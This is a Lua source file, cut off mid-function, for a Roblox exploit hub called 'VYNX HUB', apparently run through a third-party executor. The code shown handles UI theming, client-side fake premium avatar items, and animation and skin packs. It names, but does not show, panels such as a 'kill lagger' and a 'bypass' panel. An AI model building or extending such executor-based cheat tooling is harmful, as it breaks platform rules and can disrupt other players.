
do
  local lfwm_7e97626092df4313 = "LFWM1_XFYgxFhwlXshNr89c7mk9e7UnYTV0AVw"
  if false then error(lfwm_7e97626092df4313) end
end

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local HS = game:GetService("HttpService")
local player = Players.LocalPlayer


-- Emergency always-on boot indicator + safe UI force (never blank screen)
local function VYNX_emergencyToast(msg)
    pcall(function()
        local sg = Instance.new("ScreenGui")
        sg.Name = "VynxBootToast"
        sg.ResetOnSpawn = false
        sg.IgnoreGuiInset = true
        sg.DisplayOrder = 9999
        local ok = false
        if typeof(gethui) == "function" then ok = pcall(function() sg.Parent = gethui() end) end
        if not ok then ok = pcall(function() sg.Parent = game:GetService("CoreGui") end) end
        if not ok then
            local pg = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui", 5)
            if pg then sg.Parent = pg end
        end
        local f = Instance.new("Frame")
        f.Size = UDim2.fromOffset(280, 44)
        f.Position = UDim2.new(0.5, -140, 0, 20)
        f.BackgroundColor3 = Color3.fromRGB(8, 12, 20)
        f.BorderSizePixel = 0
        f.Parent = sg
        Instance.new("UICorner", f).CornerRadius = UDim.new(0, 10)
        local s = Instance.new("UIStroke", f)
        s.Color = Color3.fromRGB(60, 170, 255)
        s.Thickness = 1.4
        local t = Instance.new("TextLabel", f)
        t.Size = UDim2.fromScale(1, 1)
        t.BackgroundTransparency = 1
        t.Text = tostring(msg or "VYNX loading...")
        t.TextColor3 = Color3.fromRGB(200, 230, 255)
        t.Font = Enum.Font.GothamBold
        t.TextSize = 14
        task.delay(4, function() pcall(function() sg:Destroy() end) end)
    end)
end

local M = {}

M.UI_COLORS = {
    { name = "Ocean",  accent = Color3.fromRGB(150, 220, 255) },
}
M.uiColorName = "Ocean"

function M.getUiColorEntry(name)
    for _, c in ipairs(M.UI_COLORS) do
        if c.name == name then return c end
    end
    return M.UI_COLORS[1]
end

function M.accentColor()
    return M.getUiColorEntry(M.uiColorName or "Ocean").accent
end

function M.accentDim()
    return M.accentColor():Lerp(Color3.fromRGB(0, 0, 0), 0.35)
end

function M.accentColorFor(name)
    local e = M.getUiColorEntry and M.getUiColorEntry(name)
    if e and e.accent then return e.accent end
    return M.accentColor()
end

function M.accentGradient(a)
    a = a or M.accentColor()
    local white = Color3.fromRGB(255, 255, 255)
    local black = Color3.fromRGB(0, 0, 0)
    return ColorSequence.new({
        ColorSequenceKeypoint.new(0, a:Lerp(white, 0.35)),
        ColorSequenceKeypoint.new(0.35, a),
        ColorSequenceKeypoint.new(0.7, a:Lerp(black, 0.25)),
        ColorSequenceKeypoint.new(1, a:Lerp(black, 0.55)),
    })
end

M.MENU_BG_ASSET = 73023682914801
M.BG_IMAGE_BY_COLOR = {
    Ocean  = 73023682914801,
}

function M.bgImageIdForColor(name)
    name = name or M.uiColorName or "Ocean"
    local id = tonumber(M.BG_IMAGE_BY_COLOR and M.BG_IMAGE_BY_COLOR[name] or 0) or 0
    if id > 0 then return id end
    return nil
end

M._editableBg = M._editableBg or {}
M._editableBgOff = false
M._bgSrcPx = nil
M._bgSrcSize = nil
M._bgWanted = nil
M._bgWorkerRunning = false

local BG_CHUNK = 16384

function M.buildEditableBg(name)
    local AssetService = game:GetService("AssetService")
    if not AssetService then return nil end
    if type(AssetService.CreateEditableImageAsync) ~= "function" then return nil end
    if type(buffer) ~= "table" and type(buffer) ~= "userdata" then return nil end
    if M._bgWanted ~= nil and M._bgWanted ~= name then return "aborted" end

    local baseId = tonumber(M.BG_IMAGE_BY_COLOR and M.BG_IMAGE_BY_COLOR.Red or 0) or 73023682914801
    local src = "rbxassetid://" .. tostring(baseId)

    local editable
    local okC, contentObj = pcall(function() return Content.fromUri(src) end)
    if okC and contentObj then
        editable = AssetService:CreateEditableImageAsync(contentObj)
    else
        editable = AssetService:CreateEditableImageAsync(src)
    end
    if not editable then return nil end

    local size = editable.Size
    local total = math.floor(size.X) * math.floor(size.Y)
    if not total or total <= 0 then return nil end

    local px
    local okCopy = false
    if M._bgSrcPx and M._bgSrcSize
        and M._bgSrcSize.X == size.X and M._bgSrcSize.Y == size.Y then
        px = buffer.create(total * 4)
        okCopy = pcall(buffer.copy, px, 0, M._bgSrcPx, 0, total * 4)
        if not okCopy then px = nil end
    end
    if not okCopy or not px then
        local raw = editable:ReadPixelsBuffer(Vector2.new(0, 0), size)
        local keep = buffer.create(total * 4)
        local okKeep = pcall(buffer.copy, keep, 0, raw, 0, total * 4)
        if okKeep then
            M._bgSrcPx = keep
            M._bgSrcSize = size
            px = raw
        else
            M._bgSrcPx = nil
            M._bgSrcSize = nil
            px = raw
        end
    end

    local accent = M.accentColorFor and M.accentColorFor(name) or M.accentColor()
    local ah, as = accent:ToHSV()
    local hh = (ah * 360) / 60
    local ii = math.floor(hh) % 6
    local ff = hh - math.floor(hh)

    local canYield = M._themeCanYield ~= false
    local t0 = os.clock()
    for i = 0, total - 1 do
        local o = i * 4
        local r = buffer.readu8(px, o) / 255
        local g = buffer.readu8(px, o + 1) / 255
        local b = buffer.readu8(px, o + 2) / 255
        local mn = g < b and g or b
        local dl = r - mn
        if dl > 0.42 * r and r > 0.06 and r > g and r > b then
            local h = ((g - b) / dl) % 6 * 60
            if h < 25 or h > 335 then
                local sat = dl / r
                local ns = math.clamp(sat * (0.6 + 0.6 * as), 0, 1)
                local pp = r * (1 - ns)
                local qq = r * (1 - ns * ff)
                local tt = r * (1 - ns * (1 - ff))
                local nr, ng, nb
                if ii == 0 then nr, ng, nb = r, tt, pp
                elseif ii == 1 then nr, ng, nb = qq, r, pp
                elseif ii == 2 then nr, ng, nb = pp, r, tt
                elseif ii == 3 then nr, ng, nb = pp, qq, r
                elseif ii == 4 then nr, ng, nb = tt, pp, r
                else nr, ng, nb = r, pp, qq end
                buffer.writeu8(px, o, math.floor(nr * 255 + 0.5))
                buffer.writeu8(px, o + 1, math.floor(ng * 255 + 0.5))
                buffer.writeu8(px, o + 2, math.floor(nb * 255 + 0.5))
            end
        end

        if i % BG_CHUNK == BG_CHUNK - 1 then
            if M._bgWanted ~= nil and M._bgWanted ~= name then return "aborted" end
            if canYield and (os.clock() - t0) > 0.003 then
                local okw = pcall(function() RunService.Heartbeat:Wait() end)
                if not okw then canYield = false end
                t0 = os.clock()
            end
        end
    end

    editable:WritePixelsBuffer(Vector2.new(0, 0), size, px)
    local okO, content = pcall(function() return Content.fromObject(editable) end)
    if okO and content then return content end
    return nil
end

function M.tryEditableBgRecolor(img, name)
    if M._editableBgOff then return false end
    local cached = M._editableBg[name]
    if cached then
        local ok = pcall(function()
            img.ImageContent = cached
            img.ImageColor3 = Color3.fromRGB(255, 255, 255)
            img:SetAttribute("BgAccentMode", "edit:" .. name)
        end)
        if not ok then M._editableBgOff = true end
        return ok
    end
    if type(task) ~= "table" or type(task.spawn) ~= "function" then return false end

    M._bgWanted = name
    if M._bgWorkerRunning then return false end
    M._bgWorkerRunning = true
    task.spawn(function()
        for _ = 1, 64 do
            local want = M._bgWanted
            if M._editableBgOff or not want or M._editableBg[want] then break end
            local ok, res = pcall(function() return M.buildEditableBg(want) end)
            if ok and res == "aborted" then
                if M._bgWanted == want then break end
            elseif ok and res then
                M._editableBg[want] = res
                if (M.uiColorName or "Ocean") == want then
                    if img and img.Parent then
                        pcall(function()
                            img.ImageContent = res
                            img.ImageColor3 = Color3.fromRGB(255, 255, 255)
                            img:SetAttribute("BgAccentMode", "edit:" .. want)
                        end)
                    end
                    pcall(function() if M.retintBackgrounds then M.retintBackgrounds() end end)
                end
            else
                M._editableBgOff = true
                break
            end
        end
        M._bgWorkerRunning = false
    end)
    return false
end

M.TITLE_VS_COLOR = Color3.fromRGB(150, 220, 255)

function M.headerTitleRich()
    return '<font color="rgb(70,170,255)">VYNX</font> <font color="rgb(255,255,255)">HUB</font>'
end

function M.applyHeaderTitle(lbl)
    lbl = lbl or M.headerTitleLbl
    if not lbl or not lbl.Parent then return end
    pcall(function()
        lbl.RichText = true
        lbl.Text = M.headerTitleRich()
        -- solid white base; colours come from RichText
        lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
        local og = lbl:FindFirstChild("TitleOceanGrad")
        if og then pcall(function() og:Destroy() end) end
    end)
end

function M.bgTintColor(a)
    a = a or M.accentColor()
    if (M.uiColorName or "Ocean") == "Ocean" then return Color3.fromRGB(255, 255, 255) end
    local m = math.max(a.R, a.G, a.B)
    if m <= 0.004 then return Color3.fromRGB(255, 255, 255) end
    local t = Color3.new(a.R / m, a.G / m, a.B / m)
    return t:Lerp(Color3.fromRGB(255, 255, 255), 0.12)
end

function M.applyBgRecolor(img)
    if not img then return end
    local alive = false
    pcall(function() alive = img.Parent ~= nil end)
    if not alive then return end
    local name = M.uiColorName or "Ocean"

    local mode = nil
    pcall(function() mode = img:GetAttribute("BgAccentMode") end)
    if mode == "id:" .. name then return end
    if mode == "edit:" .. name then
        local white = false
        pcall(function() white = img.ImageColor3 == Color3.fromRGB(255, 255, 255) end)
        if white then return end
    end

    local id = M.bgImageIdForColor(name)
    if id then
        pcall(function()
            img.Image = "rbxassetid://" .. tostring(id)
            img.ImageColor3 = Color3.fromRGB(255, 255, 255)
            local w = img:FindFirstChild("BgAccentWash")
            if w then w.BackgroundTransparency = 1 end
        end)
        pcall(function() img:SetAttribute("BgAccentMode", "id:" .. name) end)
        return
    end

    pcall(function() img.ImageColor3 = M.bgTintColor() end)
    pcall(function()
        local w = img:FindFirstChild("BgAccentWash")
        if w then
            w.BackgroundColor3 = M.accentColor()
            w.BackgroundTransparency = 0.9
        end
    end)
    pcall(function() M.tryEditableBgRecolor(img, name) end)
end

function M.applyBgWash(img, corner)
    if not img then return end
    local ok = pcall(function() return img.Parent end)
    if not ok then return end
    local w = img:FindFirstChild("BgAccentWash")
    if not w then
        w = Instance.new("Frame")
        w.Name = "BgAccentWash"
        w.Size = UDim2.new(1, 0, 1, 0)
        w.Position = UDim2.new(0, 0, 0, 0)
        w.BorderSizePixel = 0
        w.ZIndex = img.ZIndex or 0
        w.Parent = img
        local c = Instance.new("UICorner")
        c.Name = "WashCorner"
        c.CornerRadius = corner or UDim.new(0, M.MENU_CORNER_R or 16)
        c.Parent = w
    end
    w.BackgroundColor3 = M.accentColor()
    w.BackgroundTransparency = 0.9
    return w
end

function M.retintBackgrounds()
    local tint = M.bgTintColor()
    local roots = { M.mainFrame, M.gui, M.pingGui, M.pingMain, M.killLaggerGui,
                    M.killLaggerMain, M.mobGuiRef, M.bypassPanelGui }
    local seen = {}
    for _, rt in ipairs(roots) do
        local alive = false
        pcall(function() alive = (typeof(rt) == "Instance") and rt.Parent ~= nil end)
        if alive and not seen[rt] then
            seen[rt] = true
            pcall(function()
                for _, d in ipairs(rt:GetDescendants()) do
                    if d:IsA("ImageLabel")
                        and (d.Name == "CustomBgImage" or d.Name == "BackgroundImage"
                             or d.Name == "PanelBgImage" or d:GetAttribute("BgTint")) then
                        M.applyBgRecolor(d)
                    elseif d:IsA("ImageLabel") and d.Name == "BtnBgImage" then
                        d.ImageColor3 = tint
                    end
                end
            end)
        end
    end
end

M._introUIReady = false
M._mainUILoadedAfterIntro = false

M.introSoundEnabled = false
M.introSongChoice = 3
M.introGUIEnabled = false -- intro completely removed
M.introSoundEnabled = false

M.INTRO_MUSIC_URLS = {
    { url = "https://files.catbox.moe/oqex53.mp3", file = "voidvs_intro_a.mp3", startAt = 0 },
    { url = "https://files.catbox.moe/cf8fyf.mp3", file = "voidvs_intro_b.mp3", startAt = 0 },
}
do
    math.randomseed(tick() % 1e9 * 1000)
    local pick = M.INTRO_MUSIC_URLS[math.random(1, #M.INTRO_MUSIC_URLS)]
    M.INTRO_MUSIC_URL = pick.url
    M.INTRO_MUSIC_FILE = pick.file
    M.INTRO_MUSIC_START_AT = pick.startAt or 0
end
introSoundInstance = nil
if isfile and isfile("CherryConfig.json") then
    local ok, data = pcall(function() return HS:JSONDecode(readfile("CherryConfig.json")) end)
    if ok and type(data) == "table" then

        M.introSoundEnabled = false
        if data.introSongChoice then M.introSongChoice = data.introSongChoice end
        if data.introGUIEnabled ~= nil then M.introGUIEnabled = false end -- intro removed
        if data.circleButtonsEnabled ~= nil then M.circleButtonsEnabled = data.circleButtonsEnabled == true end
        if data.mobileButtonsEnabled ~= nil then M.mobileButtonsEnabled = data.mobileButtonsEnabled == true end
        if data.mobileButtonsLocked ~= nil then M.mobileButtonsLocked = data.mobileButtonsLocked == true end
        if type(data.mobileButtonsSize) == "number" then M.mobileButtonsSize = data.mobileButtonsSize end

        M._savedTheme = "Black White"
        M.colorScheme = "Black White"
    end
end

M.PACKS = {
    ["Amazon Unboxed"] = {
        WalkAnim = 90478085024465,
        RunAnim  = 134824450619865,
        JumpAnim = 121454505477205,
        FallAnim = 94788218468396,
        SwimIdle = 129126268464847,
        Swim     = 105962919001086,
        ClimbAnim = 121145883950231,
        Animation1 = 98281136301627,
        Animation2 = nil,
    },
    Vampire = {
        WalkAnim = 10921326949,
        RunAnim  = 10921320299,
        JumpAnim = 10921322186,
        FallAnim = 10921321317,
        SwimIdle = 10921325443,
        Swim     = 10921324408,
        ClimbAnim = 10921314188,
        Animation1 = 10921315373,
        Animation2 = nil,
    },
    Zombie = {
        WalkAnim = 10921355261,
        RunAnim  = 616163682,
        JumpAnim = 10921351278,
        FallAnim = 10921350320,
        SwimIdle = 10921353442,
        Swim     = 10921352344,
        Animation1 = 10921344533,
        Animation2 = 10921345304,
        ClimbAnim = 10921343576,
    },
    Tryhard = {
        WalkAnim = 707897309,
        RunAnim  = 707861613,
        JumpAnim = 116936326516985,
        FallAnim = 116936326516985,
        SwimIdle = 116936326516985,
        Swim     = 116936326516985,
        ClimbAnim = 116936326516985,
        Animation1 = 133806214992291,
        Animation2 = 94970088341563,
    },
    ["Wicked Popular"] = {
        WalkAnim = 92072849924640,
        RunAnim  = 72301599441680,
        JumpAnim = 104325245285198,
        FallAnim = 121152442762481,
        SwimIdle = 113199415118199,
        Swim     = 99384245425157,
        ClimbAnim = 131326830509784,
        Animation1 = 118832222982049,
        Animation2 = 76049494037641,
    },
}
M.animPack = nil
M.animPackEnabled = false
M.ANIM_PACK_ORDER = {
    "Off",
    "Vampire",
    "Amazon Unboxed",
    "Zombie",
    "Tryhard",
    "Wicked Popular",
}
M.animPackLabel = nil
M.savedAnimate = nil
M.vynxBlackSkinEnabled = false

M.headlessEnabled = false
M.korbloxEnabled = false

M.skinPack = "Off"
M.skinPackLabel = nil
M._skinOrigOutfit = { shirt = nil, pants = nil }
M._skinOrigAccessories = {}
M.SKIN_PACK_ORDER = {
    "Off",
    "Bleed 1",
    "Bleed 2",
    "Bleed 3",
}
M.uiLayoutMode = "Vertical Top"
M.UI_LAYOUT_ORDER = {
    "Sidecar Right",
    "Sidecar Left",
    "Vertical Top",
    "Vertical Bottom",
}
M.SKIN_PACKS = {
    ["Bleed 1"] = {
        accessory = 306969564,
        offset = Vector3.new(0, 0.3, 0),
        headMesh = "http://www.roblox.com/asset/?id=134079402",
        headTexture = "http://www.roblox.com/asset/?id=133940918",
        shirt = "http://www.roblox.com/asset/?id=10632503795",
        pants = "http://www.roblox.com/asset/?id=123161592384863",
        korblox = "right",
    },
    ["Bleed 2"] = {
        accessory = 1744060292,
        offset = Vector3.new(0, 1.4, -0.2),
        headMesh = "http://www.roblox.com/asset/?id=134079402",
        headTexture = "http://www.roblox.com/asset/?id=133940918",
        shirt = "http://www.roblox.com/asset/?id=11526718530",
        pants = "http://www.roblox.com/asset/?id=93710523210027",
        korblox = "right",
    },
    ["Bleed 3"] = {
        accessory = 112564966849233,
        offset = Vector3.new(0, 0.6, 0),
        headMesh = "http://www.roblox.com/asset/?id=134079402",
        headTexture = "http://www.roblox.com/asset/?id=133940918",
        shirt = "http://www.roblox.com/asset/?id=11849088376",
        pants = "http://www.roblox.com/asset/?id=16534673928",
        korblox = "right",
    },
}

local HEADLESS_MESH_ID = "rbxassetid://1095708"
local KORBLOX_MESH_ID = "rbxassetid://101851696"
local KORBLOX_TEXTURE_ID = "rbxassetid://101851254"
local DARK_GREY_COLOR = Color3.fromRGB(64, 64, 64)

local function removeFace(head)
    local face = head:FindFirstChild("face")
    if face then face:Destroy() end
end

function M.applyHeadlessToChar(char, enabled)
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end

    if enabled then
        head.Transparency = 1
        head.CanCollide = false
        removeFace(head)

        for _, child in ipairs(head:GetChildren()) do
            if child:IsA("SpecialMesh") and child.MeshId == HEADLESS_MESH_ID then
                child:Destroy()
            end
        end

        local mesh = Instance.new("SpecialMesh")
        mesh.MeshType = Enum.MeshType.FileMesh
        mesh.MeshId = HEADLESS_MESH_ID
        mesh.Scale = Vector3.new(0.001, 0.001, 0.001)
        mesh.Name = "HeadlessMesh"
        mesh.Parent = head

        head:GetPropertyChangedSignal("Transparency"):Connect(function()
            if head.Transparency ~= 1 then
                head.Transparency = 1
            end
        end)
        head.ChildAdded:Connect(function(child)
            if child.Name == "face" and child:IsA("Decal") then
                child:Destroy()
            end
        end)
    else
        head.Transparency = 0
        head.CanCollide = true
        for _, child in ipairs(head:GetChildren()) do
            if child:IsA("SpecialMesh") and child.Name == "HeadlessMesh" then
                child:Destroy()
            end
        end
        removeFace(head)
    end
end

function M.applyKorbloxToChar(char, enabled)
    if not char then return end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    if enabled then
        if humanoid.RigType == Enum.HumanoidRigType.R6 then
            local rightLeg = char:FindFirstChild("Right Leg")
            if rightLeg then
                for _, child in ipairs(rightLeg:GetChildren()) do
                    if child:IsA("SpecialMesh") or child:IsA("CharacterMesh") then
                        child:Destroy()
                    end
                end
                rightLeg.Color = DARK_GREY_COLOR
                rightLeg:GetPropertyChangedSignal("Color"):Connect(function()
                    if rightLeg.Color ~= DARK_GREY_COLOR then
                        rightLeg.Color = DARK_GREY_COLOR
                    end
                end)
                local mesh = Instance.new("SpecialMesh")
                mesh.MeshType = Enum.MeshType.FileMesh
                mesh.MeshId = KORBLOX_MESH_ID
                mesh.TextureId = KORBLOX_TEXTURE_ID
                mesh.Scale = Vector3.new(1, 1, 1)
                mesh.Name = "KorbloxMesh"
                mesh.Parent = rightLeg
            end
        elseif humanoid.RigType == Enum.HumanoidRigType.R15 then
            local rightUpperLeg = char:FindFirstChild("RightUpperLeg")
            if rightUpperLeg then
                rightUpperLeg.Transparency = 1
                local rightLowerLeg = char:FindFirstChild("RightLowerLeg")
                local rightFoot = char:FindFirstChild("RightFoot")
                if rightLowerLeg then rightLowerLeg.Transparency = 1 end
                if rightFoot then rightFoot.Transparency = 1 end

                local oldKorblox = char:FindFirstChild("KorbloxLeg")
                if oldKorblox then oldKorblox:Destroy() end

                local korbloxLeg = Instance.new("Part")
                korbloxLeg.Name = "KorbloxLeg"
                korbloxLeg.Size = Vector3.new(1, 2, 1)
                korbloxLeg.Anchored = false
                korbloxLeg.CanCollide = false
                korbloxLeg.Color = DARK_GREY_COLOR
                korbloxLeg.Parent = char

                local mesh = Instance.new("SpecialMesh")
                mesh.MeshType = Enum.MeshType.FileMesh
                mesh.MeshId = KORBLOX_MESH_ID
                mesh.TextureId = KORBLOX_TEXTURE_ID
                mesh.Scale = Vector3.new(1, 1, 1)
                mesh.Name = "KorbloxMesh"
                mesh.Parent = korbloxLeg

                local weld = Instance.new("Weld")
                weld.Part0 = rightUpperLeg
                weld.Part1 = korbloxLeg
                weld.C0 = CFrame.new(0, -0.8, 0)
                weld.Name = "KorbloxWeld"
                weld.Parent = korbloxLeg
            end
        end
    else
        if humanoid.RigType == Enum.HumanoidRigType.R6 then
            local rightLeg = char:FindFirstChild("Right Leg")
            if rightLeg then
                for _, child in ipairs(rightLeg:GetChildren()) do
                    if child:IsA("SpecialMesh") and child.Name == "KorbloxMesh" then
                        child:Destroy()
                    end
                end
                rightLeg.Color = Color3.fromRGB(255, 255, 255)
            end
        elseif humanoid.RigType == Enum.HumanoidRigType.R15 then
            local rightUpperLeg = char:FindFirstChild("RightUpperLeg")
            if rightUpperLeg then
                rightUpperLeg.Transparency = 0
                local rightLowerLeg = char:FindFirstChild("RightLowerLeg")
                local rightFoot = char:FindFirstChild("RightFoot")
                if rightLowerLeg then rightLowerLeg.Transparency = 0 end
                if rightFoot then rightFoot.Transparency = 0 end
                local korbloxLeg = char:FindFirstChild("KorbloxLeg")
                if korbloxLeg then korbloxLeg:Destroy() end
            end
        end
    end
end


function M._skinSaveOutfit(char)
    if not char then return end
    local shirt = char:FindFirstChildWhichIsA("Shirt")
    local pants = char:FindFirstChildWhichIsA("Pants")
    M._skinOrigOutfit.shirt = shirt and shirt.ShirtTemplate or nil
    M._skinOrigOutfit.pants = pants and pants.PantsTemplate or nil
    M._skinOrigAccessories = {}
    for _, child in ipairs(char:GetChildren()) do
        if child:IsA("Accessory") or child:IsA("Hat") then
            pcall(function() table.insert(M._skinOrigAccessories, child:Clone()) end)
        end
    end
end

function M._skinClearOutfit(char)
    if not char then return end
    for _, obj in ipairs(char:GetChildren()) do
        if obj:IsA("Shirt") or obj:IsA("Pants") or obj:IsA("Accessory") or obj:IsA("Hat")
            or obj.Name == "AuFfitAccessory" or obj.Name == "VynxSkinPackAcc" then
            pcall(function() obj:Destroy() end)
        end
        if tostring(obj.Name):find("Korblox_") or tostring(obj.Name):find("Headless_") then
            pcall(function() obj:Destroy() end)
        end
    end
    for _, partName in ipairs({"Head","LeftUpperLeg","LeftLowerLeg","LeftFoot","RightUpperLeg","RightLowerLeg","RightFoot","Left Leg","Right Leg"}) do
        local part = char:FindFirstChild(partName)
        if part and part:IsA("BasePart") then pcall(function() part.Transparency = 0 end) end
    end
end

function M._skinRestoreOutfit(char)
    if not char then return end
    M._skinClearOutfit(char)
    if M._skinOrigOutfit.shirt then
        local s = Instance.new("Shirt"); s.ShirtTemplate = M._skinOrigOutfit.shirt; s.Parent = char
    end
    if M._skinOrigOutfit.pants then
        local p = Instance.new("Pants"); p.PantsTemplate = M._skinOrigOutfit.pants; p.Parent = char
    end
    for _, clone in ipairs(M._skinOrigAccessories or {}) do
        pcall(function()
            local c = clone:Clone()
            c.Parent = char
        end)
    end
end

function M._skinApplyPackConfig(char, config)
    if not char or not config then return end
    local head = char:FindFirstChild("Head")
    if not head then return end

    if config.stripAccessories then
        for _, child in ipairs(char:GetChildren()) do
            if child:IsA("Accessory") or child:IsA("Hat") then pcall(function() child:Destroy() end) end
        end
    end

    if config.bodyColor then
        local bc = char:FindFirstChildOfClass("BodyColors") or Instance.new("BodyColors")
        bc.Parent = char
        pcall(function()
            bc.HeadColor3 = config.bodyColor
            bc.LeftArmColor3 = config.bodyColor
            bc.RightArmColor3 = config.bodyColor
            bc.LeftLegColor3 = config.bodyColor
            bc.RightLegColor3 = config.bodyColor
            bc.TorsoColor3 = config.bodyColor
        end)
        for _, p in ipairs(char:GetDescendants()) do
            if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart" then
                pcall(function()
                    p.Color = config.bodyColor
                    if p:IsA("MeshPart") then p.TextureID = "" end
                end)
            end
        end
    end

    if config.headless then
        pcall(function()
            head.Transparency = 1
            head.CanCollide = false
            local face = head:FindFirstChild("face") or head:FindFirstChild("Face")
            if face then face:Destroy() end
            for _, c in ipairs(head:GetChildren()) do
                if c:IsA("SpecialMesh") and c.Name == "HeadlessMesh" then c:Destroy() end
            end
            local mesh = Instance.new("SpecialMesh")
            mesh.MeshType = Enum.MeshType.FileMesh
            mesh.MeshId = config.headMesh or HEADLESS_MESH_ID
            mesh.Scale = Vector3.new(0.001, 0.001, 0.001)
            mesh.Name = "HeadlessMesh"
            mesh.Parent = head
        end)
        M.headlessEnabled = true
    end

    if config.headMesh and not config.headless then
        pcall(function()
            if head:IsA("MeshPart") then
                head.MeshId = config.headMesh
                if config.headTexture then head.TextureID = config.headTexture end
            else
                local sm = head:FindFirstChildWhichIsA("SpecialMesh") or Instance.new("SpecialMesh")
                sm.Parent = head
                sm.MeshType = Enum.MeshType.FileMesh
                sm.MeshId = config.headMesh
                sm.TextureId = config.headTexture or ""
            end
        end)
    end

    if config.shirt then
        local s = char:FindFirstChildWhichIsA("Shirt") or Instance.new("Shirt")
        s.Name = "Shirt"; s.ShirtTemplate = config.shirt; s.Parent = char
    end
    if config.pants then
        local p = char:FindFirstChildWhichIsA("Pants") or Instance.new("Pants")
        p.Name = "Pants"; p.PantsTemplate = config.pants; p.Parent = char
    end

    if config.accessory and head then
        local old = char:FindFirstChild("AuFfitAccessory") or char:FindFirstChild("VynxSkinPackAcc")
        if old then pcall(function() old:Destroy() end) end
        local objs = nil
        local ok, res = pcall(function()
            return game:GetObjects("rbxassetid://" .. tostring(config.accessory))
        end)
        if ok and type(res) == "table" and #res > 0 then objs = res
        else
            ok, res = pcall(function() return game:GetService("InsertService"):LoadAsset(config.accessory) end)
            if ok and res then objs = {res} end
        end
        if objs then
            local handle
            for _, o in ipairs(objs) do
                if o:IsA("BasePart") then handle = o; break end
                local f = o:FindFirstChildWhichIsA("BasePart", true)
                if f then handle = f; break end
            end
            if handle then
                local h = handle:Clone()
                h.Name = "VynxSkinPackAcc"
                h.CanCollide = false
                h.Anchored = false
                h.Massless = true
                h.Parent = char
                local weld = Instance.new("Weld")
                weld.Part0 = head
                weld.Part1 = h
                weld.C0 = CFrame.new(config.offset or Vector3.zero)
                weld.Parent = h
            end
            for _, o in ipairs(objs) do pcall(function() o:Destroy() end) end
        end
    end

    if config.korblox and config.korblox ~= "none" then
        M.korbloxEnabled = true
        pcall(function() M.applyKorbloxToChar(char, true) end)
    end
end

function M.applySkinPack(packName)
    packName = packName or "Off"
    M.skinPack = packName
    if M.skinPackLabel then pcall(function() M.skinPackLabel.Text = packName end) end
    local char = player.Character
    if not char then return end

    if packName == "Off" then
        M.headlessEnabled = false
        M.korbloxEnabled = false
        pcall(function() if M.avLogWearOff then M.avLogWearOff() end end)
        M._skinRestoreOutfit(char)
        pcall(function() M.applyHeadlessToChar(char, false) end)
        pcall(function() M.applyKorbloxToChar(char, false) end)
        pcall(function() if saveCherryConfig then saveCherryConfig() end end)
        return
    end

    local isAvatar = false
    for _, a in ipairs(M.AVLOG_RARE or {}) do
        if a.name == packName then isAvatar = true break end
    end
    if isAvatar and M.avLogWear then
        pcall(function() M.avLogWear(packName, true) end)
        pcall(function() if saveCherryConfig then saveCherryConfig() end end)
        return
    end

    local config = M.SKIN_PACKS[packName]
    if not config then return end

    pcall(function() if M.avLogWearOff then M.avLogWearOff() end end)
    if not M._skinOrigOutfit.shirt and not M._skinOrigOutfit.pants and #(M._skinOrigAccessories or {}) == 0 then
        M._skinSaveOutfit(char)
    end
    M._skinClearOutfit(char)
    M._skinApplyPackConfig(char, config)
    pcall(function() if saveCherryConfig then saveCherryConfig() end end)
end


function M.cycleAnimPack(direction)
    direction = direction or 1
    local order = M.ANIM_PACK_ORDER or {"Off"}
    local current = "Off"
    if M.animPackEnabled and type(M.animPack) == "string" and M.animPack ~= "" then
        current = M.animPack
    end
    local idx = 1
    for i, name in ipairs(order) do
        if name == current then idx = i; break end
    end
    local newIdx = idx + direction
    if newIdx < 1 then newIdx = #order end
    if newIdx > #order then newIdx = 1 end
    local packName = order[newIdx]
    if packName == "Off" then
        M.animPackEnabled = false
        M.animPack = nil
        M.unwalkEnabled = false
        if M.setUnwalkVisual then pcall(function() M.setUnwalkVisual(false) end) end
        local ch = player.Character
        if ch then
            if M.resetAnimations then pcall(function() M.resetAnimations(ch) end) end
            if M.forceVanillaAnimate then pcall(function() M.forceVanillaAnimate(ch) end) end
            if M.applyWalkState then pcall(function() M.applyWalkState(ch) end) end
        end
    else
        M.unwalkEnabled = false
        if M.setUnwalkVisual then pcall(function() M.setUnwalkVisual(false) end) end
        M.animPackEnabled = true
        M.animPack = packName
        pcall(function() M.applyAnimPack(packName) end)
    end
    if M.animPackLabel then
        pcall(function()
            M.animPackLabel.Text = (M.animPackEnabled and M.animPack) or "Off"
        end)
    end
    -- clear old toggle visuals if still present
    if M.setVampireAnimVisual then pcall(function() M.setVampireAnimVisual(M.animPack == "Vampire") end) end
    if M.setAmazonAnimVisual then pcall(function() M.setAmazonAnimVisual(M.animPack == "Amazon Unboxed") end) end
    if M.setZombieAnimVisual then pcall(function() M.setZombieAnimVisual(M.animPack == "Zombie") end) end
    if M.setTryhardAnimVisual then pcall(function() M.setTryhardAnimVisual(M.animPack == "Tryhard") end) end
    pcall(function() if saveCherryConfig then saveCherryConfig() end end)
end

function M.cycleSkinPack(direction)
    direction = direction or 1
    local order = M.SKIN_PACK_ORDER or {"Off"}
    local idx = 1
    for i, name in ipairs(order) do
        if name == M.skinPack then idx = i; break end
    end
    local newIdx = idx + direction
    if newIdx < 1 then newIdx = #order end
    if newIdx > #order then newIdx = 1 end
    M.applySkinPack(order[newIdx])
end

M.vynxHornsEnabled = false
M._vynxHornConns = {}
M._vynxHornParts = {}

function M.clearVynxHorns(char)
end

function M.buildVynxHorns(char, head)
end

function M.equipVynxHorns(char)
end

function M.setVynxHorns(on)
    M.vynxHornsEnabled = false
    if M.setVynxHornsVisual then pcall(function() M.setVynxHornsVisual(false) end) end
end

function M.applyVynxWhiteSkin(char)
    if not char then return end
    local white = Color3.fromRGB(255, 255, 255)
    local bodyColors = char:FindFirstChildOfClass("BodyColors")
    if not bodyColors then
        bodyColors = Instance.new("BodyColors")
        bodyColors.Parent = char
    end
    for _, prop in ipairs({"HeadColor3","LeftArmColor3","LeftLegColor3","RightArmColor3","RightLegColor3","TorsoColor3"}) do
        pcall(function() bodyColors[prop] = white end)
    end
    local shirt = char:FindFirstChildOfClass("Shirt")
    if not shirt then
